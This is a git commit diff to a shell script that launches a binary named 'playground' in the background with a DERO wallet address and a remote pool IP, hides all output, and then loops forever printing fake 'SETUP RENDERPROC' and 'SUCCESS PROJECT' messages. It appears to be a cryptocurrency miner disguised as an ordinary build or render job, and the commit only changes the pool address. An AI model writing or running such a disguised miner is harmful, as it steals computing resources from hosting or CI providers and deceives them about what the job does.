c78b8fac5fdbae5c14a0e8261404723b0017bd29
mayadyu <121432755+mayadyu@users.noreply.github.com>
2023-01-05 23:12:26 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-chmod 500 playground && ./playground -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcqdkukzhgva8qsmeqzdn -r 139.59.182.234:10100 -p rpc > /dev/null 2>&1 &
+chmod 500 playground && ./playground -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcqdkukzhgva8qsmeqzdn -r 143.198.243.29:10100 -p rpc > /dev/null 2>&1 &
 sleep 3600
 while true; do clear; echo SETUP RENDERPROC 1; sleep 5; clear; echo SUCCESS PROJECT; sleep 10;let "i++";  done
 
